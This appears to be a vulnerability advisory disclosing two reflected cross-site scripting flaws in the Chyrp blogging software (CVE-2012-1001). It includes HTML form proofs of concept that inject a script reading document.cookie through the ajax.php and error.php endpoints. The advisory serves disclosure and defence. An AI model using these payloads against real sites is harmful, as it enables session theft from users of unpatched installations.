Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Chyrp, which can be exploited to perform Cross Site Scripting attacks.

1) Cross Site Scripting (XSS) in Chyrp: CVE-2012-1001

1.1 Input passed via the "content" POST parameter to /includes/ajax.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:


<form action="http://[host]/includes/ajax.php" method="post">
<input type="hidden" name="action" value="preview" />
<input type="hidden" name="feather" value="" />
<input type="hidden" name="field" value="" />
<input type="hidden" name="content" value='<script>alert(document.cookie);</script>' />
<input type="submit" id="btn"> 
</form>


1.2 Input passed via the "body" POST parameter to /includes/error.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:


<form action="http://[host]/includes/error.php" method="post">
<input type="hidden" name="ajax" value="1" />
<input type="hidden" name="body" value='<script>alert(document.cookie);</script>' />
<input type="submit" id="btn"> 
</form>


Successful exploitation of this vulnerability (1.2) requires that "register_globals" is enabled.
